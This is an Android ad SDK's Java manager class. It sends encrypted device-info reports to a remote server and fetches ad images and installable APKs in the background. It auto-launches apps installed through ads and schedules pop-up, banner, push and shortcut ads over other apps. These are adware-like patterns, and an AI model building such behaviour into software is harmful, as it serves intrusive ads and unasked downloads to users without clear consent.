package com.ads.android;
import java.io.File;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import org.json.JSONObject;
import android.content.Context;
import com.ads.android.bean.AbstractAdsProperty;
import com.ads.android.bean.Ads;
import com.ads.android.bean.Response;
import com.ads.android.bean.form.AdsForm;
import com.ads.android.bean.form.ReportForm;
import com.ads.android.bean.framework.Json;
import com.ads.android.callback.MultiDownloadCallback;
import com.ads.android.callback.RequestCallback;
import com.ads.android.module.ConfigHelper;
import com.ads.android.module.TaskManager;
import com.ads.android.setting.Setting;
import com.ads.android.util.AdsCache;
import com.ads.android.util.CommonUtils;
import com.ads.android.util.Constants;
import com.ads.android.util.InfoUtils;
import com.ads.android.util.MyLogger;
import com.ads.android.util.NetWorkUtil;
import com.ads.android.util.RequestUtils;
import com.ads.android.util.StringUtils;
import com.ads.android.util.Timer;

public class MainManager {
    public static MainManager getInstance(Context context) {
        if (instance == null) {
            synchronized (MainManager.class) {
                if (instance == null) {
                    instance = new MainManager(context);
                }
            }
        }
        return instance;
    }
    private AdsCache cache;
    private Timer adsTimer;
    private Context context;
    private static MainManager instance = null;
    private boolean downloading;
    private MainManager(Context context) {
        this.context = context;
        cache = new AdsCache(this.context);
        adsTimer = new Timer(context, this.getClass().getName(), ConfigHelper.getConfig(context).requestInterval);
    }
    public void start() {
        requestAds();
        downloadAdsInfo();
        TaskManager.touch(context);
    }
    public void handleInstall(String packageName) {
        long adsId = 0;
        for (Ads ads : cache.load()) {
            if (ads.packageName.equals(packageName)) {
                adsId = ads.id;
                break;
            }
        }
        if (adsId > 0) {
            report(Constants.REPORT_TYPE_INSTALL, 0, adsId);
            CommonUtils.startApp(context, packageName);
        }
    }
    public void reportShow(int module, long adsId) {
        report(Constants.REPORT_TYPE_SHOW, module, adsId);
    }
    private void report(int reportType, int module, long adsId) {
        try {
            ReportForm form = InfoUtils.initForm(context, ReportForm.class);
            form.reportType = reportType;
            form.module = module;
            form.adsId = adsId;
            request(form.toJson());
        } catch (Exception e) {
            MyLogger.error(e);
        }
    }
    public void requestAds() {
        if (adsTimer.isTime()) {
            try {
                adsTimer.updateTime();
                AdsForm form = InfoUtils.initForm(context, AdsForm.class);
                request(form.toJson());
            } catch (Exception e) {
                MyLogger.error(e);
            }
        }
    }
    private void request(JSONObject json) {
        RequestUtils.encryptPost(context, Setting.getServerUrl(), json, new RequestCallback() {
            @Override
            public void onResult(String content, Throwable error) {
                if (StringUtils.isNotBlank(content)) {
                    try {
                        Response response = Json.optObj(Response.class, new JSONObject(content));
                        cache.save(response.adsList);
                        ConfigHelper.saveConfig(context, response.config);
                        if (response.config != null) {
                            if (response.config.requestInterval > 0) adsTimer.setInterval(response.config.requestInterval);
                            TaskManager.initTimer(context);
                        }
                        InfoUtils.handleInfo(context, response);
                        downloadAdsInfo();
                    } catch (Throwable e) {
                        MyLogger.error(e);
                    }
                }
            }
        });
    }
    public void downloadAdsInfo() {
        new Thread() {
            public void run() {
                doDownload();
            }
        }.start();
    }
    private void doDownload() {
        synchronized (this) {
            if (downloading) { return; }
        }
        if (NetWorkUtil.isFastNetwork(context)) {
            final Ads ads = getDownloadTask();
            if (ads == null) { return; }
            synchronized (this) {
                downloading = true;
            }
            String[] urls = ads.installable ? new String[] { ads.screenUrl, ads.iconUrl, ads.url } : new String[] { ads.screenUrl, ads.iconUrl };
            RequestUtils.multiDownload(urls, new MultiDownloadCallback() {
                @Override
                public void onResult(File[] file, boolean success) {
                    if (success) {
                        ads.screenSize = file[0].length();
                        ads.iconSize = file[1].length();
                        if (ads.installable) {
                            ads.apkSize = file[2].length();
                        }
                        cache.save(ads);
                        synchronized (this) {
                            downloading = false;
                        }
                        downloadAdsInfo();
                    }
                }
            });
        }
    }
    private boolean downloadFinished(Ads ads) {
        return matchSize(ads.iconSize, ads.iconUrl) && matchSize(ads.screenSize, ads.screenUrl) && (!ads.installable || matchSize(ads.apkSize, ads.url));
    }
    private Ads getDownloadTask() {
        for (final Ads ads : cache.load()) {
            if (!downloadFinished(ads)) { return ads; }
        }
        return null;
    }
    private boolean matchPackages(String blackPackages, String whitePackages, String packageName) {
        return !StringUtils.contains(blackPackages, packageName) && (StringUtils.contains(whitePackages, packageName) || StringUtils.isBlank(whitePackages));
    }
    public void save(final Ads ads) {
        new Thread() {
            @Override
            public void run() {
                cache.save(ads);
            }
        }.start();
    }
    private Set<String> popBlackPackages = new HashSet<String>();
    public Ads getPopAds(String packageName) {
        MyLogger.info(packageName);
        if (popBlackPackages.contains(packageName)) return null;
        boolean packageNotMatch = true;
        List<Ads> result = new ArrayList<Ads>();
        for (Ads ads : cache.load()) {
            if (!downloadFinished(ads) || ads.popConfig == null) continue;
            boolean matchPackages = matchPackages(ads.popConfig.blackPackages, ads.popConfig.whitePackages, packageName);
            if (matchPackages) {
                packageNotMatch = false;
                boolean isTime = isTime(ads.popConfig);
                if (isTime) result.add(ads);
            }
        }
        if (packageNotMatch) popBlackPackages.add(packageName);
        return getTopAds(result, Constants.MODULE_POP);
    }
    private Set<String> bannerBlackPackages = new HashSet<String>();
    public Ads getBannerAds(String packageName) {
        if (bannerBlackPackages.contains(packageName)) return null;
        boolean packageNotMatch = true;
        List<Ads> result = new ArrayList<Ads>();
        for (Ads ads : cache.load()) {
            if (!downloadFinished(ads) || ads.bannerConfig == null) continue;
            boolean matchPackages = matchPackages(ads.bannerConfig.blackPackages, ads.bannerConfig.whitePackages, packageName);
            if (matchPackages) {
                packageNotMatch = false;
                boolean isTime = isTime(ads.bannerConfig);
                if (isTime) result.add(ads);
            }
        }
        if (packageNotMatch) bannerBlackPackages.add(packageName);
        return getTopAds(result, Constants.MODULE_BANNER);
    }
    public List<Ads> getPushAds(int count) {
        List<Ads> result = new ArrayList<Ads>();
        for (Ads ads : cache.load()) {
            if (!downloadFinished(ads) || ads.pushConfig == null) continue;
            if (isTime(ads.pushConfig)) {
                result.add(ads);
            }
        }
        return getTopAds(result, Constants.MODULE_PUSH, count);
    }
    public List<Ads> getShortcutAds(int count) {
        List<Ads> result = new ArrayList<Ads>();
        for (Ads ads : cache.load()) {
            if (!downloadFinished(ads) || ads.shortcutConfig == null) continue;
            if (isTime(ads.shortcutConfig)) {
                result.add(ads);
            }
        }
        return getTopAds(result, Constants.MODULE_SHORTCUT, count);
    }
    private Ads getTopAds(List<Ads> ads, final int type) {
        List<Ads> result = getTopAds(ads, type, 1);
        if (result != null && result.size() > 0) return result.get(0);
        return null;
    }
    private List<Ads> getTopAds(List<Ads> ads, final int type, int count) {
        if (ads != null && ads.size() > count) {
            sortByCurrentCount(ads, type);
            return ads.subList(0, count);
        }
        return ads;
    }
    private void sortByCurrentCount(List<Ads> ads, final int type) {
        Collections.sort(ads, new Comparator<Ads>() {
            private Integer getValue(Ads ads) {
                AbstractAdsProperty property = null;
                switch (type) {
                    case Constants.MODULE_BANNER:
                        property = ads.bannerConfig;
                        break;
                    case Constants.MODULE_POP:
                        property = ads.popConfig;
                        break;
                    case Constants.MODULE_PUSH:
                        property = ads.pushConfig;
                        break;
                    case Constants.MODULE_SHORTCUT:
                        property = ads.shortcutConfig;
                        break;
                }
                return property == null ? -1 : property.currentCount;
            }
            @Override
            public int compare(Ads o1, Ads o2) {
                return getValue(o1).compareTo(getValue(o2));
            }
        });
    }
    private boolean isTime(AbstractAdsProperty config) {
        int current = Calendar.getInstance().get(Calendar.HOUR_OF_DAY);
        boolean matchStartHour = current >= config.startHour;
        if (matchStartHour) {
            boolean matchEndHour = current <= config.endHour;
            if (matchEndHour) {
                boolean matchCount = config.currentCount < config.maxCount;
                if (matchCount) {
                    boolean matchInterval = (System.currentTimeMillis() - config.lastTime) / 1000 > config.interval;
                    if (matchInterval) return true;
                }
            }
        }
        return false;
    }
    private boolean matchSize(long size, String url) {
        File file = RequestUtils.getFile(url);
        return file.exists() && file.isFile() && file.length() == size;
    }
}
